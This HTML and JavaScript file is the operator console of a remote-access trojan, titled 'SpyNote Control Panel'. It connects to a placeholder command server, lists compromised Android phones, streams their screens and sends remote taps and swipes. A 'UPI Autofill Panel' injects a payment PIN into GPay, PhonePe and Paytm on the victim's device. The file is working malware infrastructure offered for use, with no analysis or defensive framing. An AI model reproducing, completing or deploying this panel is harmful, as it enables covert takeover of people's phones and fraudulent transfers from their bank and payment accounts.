<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="http://YOUR_SERVER_IP:3000/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; 
            background: rgba(0,0,0,0.9); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        #devices h3 { color: #00ff88; margin-bottom: 15px; font-size: 18px; }
        .device { 
            padding: 15px; margin: 10px 0; background: #1e1e2e; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border-left: 4px solid #666;
            position: relative; overflow: hidden;
        }
        .device:hover { background: #2a2a3e; border-left-color: #00ff88; transform: translateX(5px); }
        .device.active { background: linear-gradient(135deg, #00ff88, #00cc66) !important; 
            color: #000; border-left-color: #fff !important; box-shadow: 0 0 20px rgba(0,255,136,0.5); }
        .device.disconnected { opacity: 0.6; border-left-color: #ff4444; }
        .device-status { font-size: 12px; margin-top: 5px; }
        .status-live { color: #00ff88; font-weight: bold; }
        .status-off { color: #ff4444; }

        #phone-frame {
            width: 420px; height: 900px; margin: 20px auto; 
            background: linear-gradient(#111, #222); border: 30px solid #1a1a1a; 
            border-radius: 60px 60px 40px 40px; position: relative; cursor: pointer; 
            touch-action: none; box-shadow: 0 30px 60px rgba(0,0,0,0.7);
        }
        #screen { 
            width: 100%; height: 100%; background: #000; border-radius: 30px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        #fps-counter { 
            position: fixed; top: 20px; right: 200px; 
            background: rgba(0,0,0,0.8); padding: 8px 12px; border-radius: 20px; 
            font-size: 14px; color: #00ff88; font-weight: bold; font-family: monospace;
        }
        #controls { 
            text-align: center; position: fixed; bottom: 25px; left: 50%; 
            transform: translateX(-50%); display: flex; gap: 10px; flex-wrap: wrap;
        }
        button {
            padding: 14px 24px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 20px rgba(0,123,255,0.4); min-width: 100px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 30px rgba(0,123,255,0.6); }
        button:active { transform: translateY(0); }
        button.danger { background: linear-gradient(45deg, #ff4757, #ff3838); }
        button.success { background: linear-gradient(45deg, #00ff88, #00cc66); }
        #status { 
            position: fixed; top: 20px; right: 20px; 
            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px; 
            font-size: 13px; border: 1px solid #333;
        }
        
        #upi-panel {
            position: fixed; top: 100px; right: 20px; 
            background: rgba(0,20,0,0.95); padding: 25px; 
            border-radius: 15px; backdrop-filter: blur(20px); 
            border: 2px solid #00ff88; min-width: 260px; box-shadow: 0 10px 30px rgba(0,255,136,0.3);
        }
        #upi-panel h3 { color: #00ff88; margin-bottom: 20px; font-size: 18px; text-align: center; }
        #upiPin { 
            width: 100%; padding: 16px; margin: 12px 0; 
            background: #1a1a1a; color: #00ff88; border: 3px solid #444; 
            border-radius: 12px; font-size: 24px; font-weight: bold; font-family: monospace;
            letter-spacing: 6px; text-align: center; transition: all 0.3s;
        }
        #upiPin:focus { 
            border-color: #00ff88; outline: none; box-shadow: 0 0 20px rgba(0,255,136,0.5);
            transform: scale(1.02);
        }
        .toggle-switch { 
            display: flex; align-items: center; justify-content: space-between; 
            margin: 20px 0; font-size: 16px; font-weight: bold;
        }
        .toggle-switch input[type="checkbox"] { width: 0; height: 0; opacity: 0; }
        .toggle-slider {
            position: relative; width: 60px; height: 30px; 
            background: #444; border-radius: 15px; margin-left: 10px;
            transition: 0.3s; cursor: pointer; box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
        }
        .toggle-slider:before {
            content: ''; position: absolute; top: 2px; left: 2px;
            width: 26px; height: 26px; background: linear-gradient(45deg, #ccc, #eee);
            border-radius: 50%; transition: 0.3s; box-shadow: 0 2px 8px rgba(0,0,0,0.3);
        }
        input[type="checkbox"]:checked + .toggle-slider { background: #00ff88; }
        input[type="checkbox"]:checked + .toggle-slider:before { transform: translateX(30px); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Connected Devices</h3>
        <div id="device-list">üîÑ Connecting...</div>
    </div>
    
    <div id="upi-panel">
        <h3>üîê UPI Autofill Panel</h3>
        <input type="text" id="upiPin" placeholder="123456" maxlength="6" autocomplete="one-time-code">
        <div class="toggle-switch">
            <span>AutoFill ON</span>
            <input type="checkbox" id="autofillToggle" checked>
            <label class="toggle-slider"></label>
        </div>
        <button class="success" onclick="sendUpiPin()">üöÄ Apply UPI PIN</button>
        <div style="margin-top: 15px; font-size: 12px; color: #00ff88; text-align: center;">
            ‚úÖ GPay/PhonePe/Paytm/PIN Auto-Type
        </div>
    </div>
    
    <div id="status">
        <div>üîó Server: <span id="connectionStatus">Connecting...</span></div>
        <div>üì± Active: <span id="selectedDevice">-</span></div>
        <div>üìä FPS: <span id="fps">0</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
        <button class="danger" onclick="restartSession()">üîÑ Restart</button>
    </div>

    <script>
        const socket = io('http://YOUR_SERVER_IP:3000'); // ‡§Ö‡§™‡§®‡§æ IP ‡§Ø‡§π‡§æ‡§Å ‡§°‡§æ‡§≤‡•á‡§Ç
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let autofillEnabled = true;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const fpsCounter = document.getElementById('fps-counter');
        const upiPinInput = document.getElementById('upiPin');
        const autofillToggle = document.getElementById('autofillToggle');

        // Socket Events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ LIVE';
            connectionStatus.style.color = '#00ff88';
            console.log('‚úÖ WebSocket Connected');
        });

        socket.on('devices-update', (devices) => {
            console.log('üì± Devices updated:', devices.length);
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width || 1080;
                deviceHeight = data.height || 1920;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen error:', e);
            }
        });

        // Initial device fetch
        fetch('http://YOUR_SERVER_IP:3000/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            if (!devices || devices.length === 0) {
                deviceList.innerHTML = '<div style="color:#ff6666; padding:20px; text-align:center;">üì± No devices online<br><small>Start app on phone</small></div>';
                return;
            }
            
            deviceList.innerHTML = devices.map(([id, info]) => `
                <div class="device ${info.connected ? '' : 'disconnected'} ${currentDevice === id ? 'active' : ''}" 
                     onclick="selectDevice('${id}', this)">
                    <div style="font-weight:bold; font-size:16px;">${info.model?.slice(0,20) || id.slice(0,12)}...</div>
                    <div style="font-size:13px; color:#888;">${info.brand || 'Android'}</div>
                    <div class="device-status">
                        <span class="${info.connected ? 'status-live' : 'status-off'}">
                            ${info.connected ? 'üü¢ LIVE (20FPS)' : 'üî¥ OFFLINE'}
                        </span>
                    </div>
                </div>
            `).join('');
        }

        function selectDevice(deviceId, element) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,12) + '...';
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            element.classList.add('active');
            console.log('üì± Selected:', deviceId);
            socket.emit('select-device', { deviceId });
        }

        // Touch/Mouse Controls
        let startX = 0, startY = 0;
        phoneFrame.addEventListener('pointerdown', (e) => {
            e.preventDefault();
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            startX = (e.clientX - rect.left) * scaleX;
            startY = (e.clientY - rect.top) * scaleY;
            sendTap(startX, startY);
        });

        phoneFrame.addEventListener('pointermove', (e) => {
            if (!currentDevice) return;
            e.preventDefault();
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            const endX = (e.clientX - rect.left) * scaleX;
            const endY = (e.clientY - rect.top) * scaleY;
            sendSwipe(startX, startY, endX, endY);
        });

        function sendTap(x, y) {
            if (!currentDevice) return alert('Select device first');
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x: Math.floor(x), 
                y: Math.floor(y) 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: Math.floor(sx), startY: Math.floor(sy),
                endX: Math.floor(ex), endY: Math.floor(ey)
            });
        }

        function sendBack() {
            if (!currentDevice) return alert('Select device first');
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendUpiPin() {
            if (!currentDevice) return alert('Select device first');
            const pin = upiPinInput.value.trim();
            if (pin.length < 4) return alert('Enter 4-6 digit UPI PIN');
            
            socket.emit('upi-pin', { 
                deviceId: currentDevice, 
                pin: pin, 
                enabled: autofillEnabled 
            });
            
            console.log('üîê UPI PIN sent:', pin);
            upiPinInput.blur();
        }

        autofillToggle.addEventListener('change', () => {
            autofillEnabled = autofillToggle.checked;
            if (currentDevice) {
                socket.emit('autofill-toggle', { 
                    deviceId: currentDevice, 
                    enabled: autofillEnabled 
                });
            }
        });

        upiPinInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendUpiPin();
        });

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else document.exitFullscreen();
        }

        function restartSession() {
            if (!currentDevice) return;
            socket.emit('restart-session', { deviceId: currentDevice });
        }
    </script>
</body>
</html>
